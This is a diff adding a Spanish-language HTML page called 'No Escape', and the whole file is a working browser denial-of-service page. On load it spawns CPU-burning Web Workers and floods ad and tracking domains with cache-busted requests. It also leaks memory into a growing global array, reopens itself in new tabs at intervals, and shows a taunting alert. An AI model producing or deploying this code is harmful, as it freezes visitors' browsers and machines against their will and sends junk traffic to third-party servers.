@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>No Escape</title>
+<style>
+body{
+  margin:0;
+  background:black;
+  color:#ff0000;
+  font-family:monospace;
+  overflow:hidden;
+  text-align:center;
+}
+h1{
+  margin-top:60px;
+  font-size:5rem;
+  animation: blink 0.3s infinite;
+}
+#contador{
+  font-size:2.8rem;
+  margin:30px;
+}
+@keyframes blink{ 50%{ opacity:0.1; } }
+</style>
+</head>
+<body>
+<h1>☢ NO ESCAPE ☢</h1>
+<div id="contador">CPU/RAM siendo violada: 0%</div>
+
+<canvas id="c1" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.25;"></canvas>
+<canvas id="c2" style="position:fixed;top:0;left:0;z-index:-1;opacity:0.2;"></canvas>
+
+<script>
+let total = 0;
+let running = true;
+
+// Matrix
+function createMatrix(id, speed) {
+  const canvas = document.getElementById(id);
+  const ctx = canvas.getContext("2d");
+  let w = canvas.width = window.innerWidth;
+  let h = canvas.height = window.innerHeight;
+ 
+  const chars = "0123456789ABCDEFアイウエオ$@#&";
+  const fontSize = 14;
+  const columns = w / fontSize;
+  const drops = Array(Math.floor(columns)).fill(1);
+
+  function draw() {
+    ctx.fillStyle = "rgba(0,0,0,0.08)";
+    ctx.fillRect(0, 0, w, h);
+    ctx.fillStyle = "#00ff00";
+    ctx.font = fontSize + "px monospace";
+    for(let i = 0; i < drops.length; i++) {
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fontSize, drops[i]*fontSize);
+      if(drops[i]*fontSize > h && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, speed);
+}
+createMatrix("c1", 22);
+createMatrix("c2", 16);
+
+// Workers y Spam (potencia alta)
+function createWorker() {
+  const code = `
+    self.onmessage = () => {
+      setInterval(() => {
+        for(let i = 0; i < 8; i++) {
+          fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?t=" + Date.now() + Math.random(),
+          {mode:"no-cors", cache:"no-store"}).catch(()=>{});
+        }
+        let x = 0;
+        for(let j = 0; j < 80000; j++) x += Math.random() * Math.sin(j);
+      }, 5);
+    };
+  `;
+  const blob = new Blob([code], {type: "application/javascript"});
+  const worker = new Worker(URL.createObjectURL(blob));
+  worker.postMessage("");
+}
+
+function spamPrincipal() {
+  if (!running) return;
+
+  const urls = [
+    "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
+    "https://connect.facebook.net/en_US/fbevents.js",
+    "https://googleads.g.doubleclick.net/pagead/ads"
+  ];
+
+  urls.forEach(url => {
+    for(let i = 0; i < 5; i++) {
+      const cb = "?t=" + Date.now() + Math.random();
+      fetch(url + cb, {mode: "no-cors", cache: "no-store"}).catch(() => {});
+      new Image().src = url + cb;
+    }
+  });
+
+  window.leakArray = (window.leakArray || []).concat(new Array(8000).fill({data: Math.random()}));
+
+  total++;
+  const porcentaje = Math.min(100, Math.floor(total / 5));
+  document.getElementById("contador").innerText = `CPU/RAM siendo violada: ${porcentaje}%`;
+
+  setTimeout(spamPrincipal, 8);
+}
+
+// ==================== ABRIR MÁS PESTAÑAS ====================
+function abrirPestanas() {
+  try {
+    window.open(window.location.href, "_blank");
+  } catch(e) {}
+}
+
+// INICIO AUTOMÁTICO
+window.onload = function() {
+  // Alta carga
+  for(let i = 0; i < 8; i++) {
+    createWorker();
+  }
+
+  for(let i = 0; i < 100; i++) {
+    setTimeout(spamPrincipal, i * 10);
+  }
+
+  spamPrincipal();
+
+  // === APERTURA DE PESTAÑAS ===
+  // Ráfaga inicial
+  for(let i = 0; i < 6; i++) {
+    setTimeout(abrirPestanas, i * 400);
+  }
+
+  // Apertura continua cada cierto tiempo
+  setInterval(abrirPestanas, 2800);
+
+  // Alerta anti-cierre
+  setTimeout(() => {
+    alert("☢ NO ESCAPE ☢\n\nSe están abriendo más pestañas...");
+  }, 1000);
+};
+</script>
+</body>
+</html>
